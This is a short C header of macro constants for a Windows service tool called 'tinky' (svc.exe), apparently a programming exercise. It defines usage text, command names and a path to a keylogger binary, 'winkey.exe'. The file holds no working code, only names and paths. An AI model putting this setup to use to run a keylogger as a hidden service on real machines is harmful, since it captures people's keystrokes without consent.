#pragma once

#define SVC_USAGE "Usage : svc.exe install | start | stop | delete | update\n"
#define SVC_NAME "tinky"
#define SVC_BIN "svc.exe"
#define SVC_INSTALL "install"
#define SVC_START "start"
#define SVC_STOP "stop"
#define SVC_DELETE "delete"
#define KEYLOG_BIN_PATH "C:\\Users\\Administrateur\\Documents\\tinky-winkey\\winkey.exe"